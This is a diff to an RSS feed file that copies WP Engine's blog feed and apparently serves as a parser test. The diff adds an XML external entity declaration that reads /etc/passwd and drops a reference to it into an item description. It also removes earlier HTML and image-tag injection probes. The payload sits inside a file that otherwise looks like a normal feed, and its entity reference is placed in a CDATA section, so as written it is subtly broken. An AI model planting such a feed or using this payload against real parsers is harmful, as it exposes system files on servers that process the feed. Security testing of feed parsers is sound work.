@@ -1,4 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
 <rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:wfw="http://wellformedweb.org/CommentAPI/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:sy="http://purl.org/rss/1.0/modules/syndication/" xmlns:slash="http://purl.org/rss/1.0/modules/slash/">
 
     <channel>
@@ -24,9 +27,7 @@
             <height>32</height>
         </image>
         <item>
-            <title>
-                <h3>test</h3>
-            </title>
+            <title>Test</title>
             <link>https://wpengine.com/blog/silver-stevie-customer-support-2023/</link>
             <comments>https://wpengine.com/blog/silver-stevie-customer-support-2023/#respond</comments>
 
@@ -49,7 +50,7 @@
             <guid isPermaLink="false">https://wpengine.com/?p=141150</guid>
 
             <description>
-                <![CDATA[At <img src=x> WP Engine, our core values have always guided our mission, and one of our core values is to remain Customer Inspired in all we do. We aim to amaze our customers with our service, expertise, and transparency, choosing to build long lasting relationships that help our customers succeed. We’re so honored that the hard<span class="tile__ellipses">&#8230;</span><span class="tile__ellipses--animated"></span>]]>
+                <![CDATA[At WP Engine, &xxe; our core values have always guided our mission, and one of our core values is to remain Customer Inspired in all we do. We aim to amaze our customers with our service, expertise, and transparency, choosing to build long lasting relationships that help our customers succeed. We’re so honored that the hard<span class="tile__ellipses">&#8230;</span><span class="tile__ellipses--animated"></span>]]>
             </description>
 
             <wfw:commentRss>https://riddle1001.github.io/csstest/feed</wfw:commentRss>
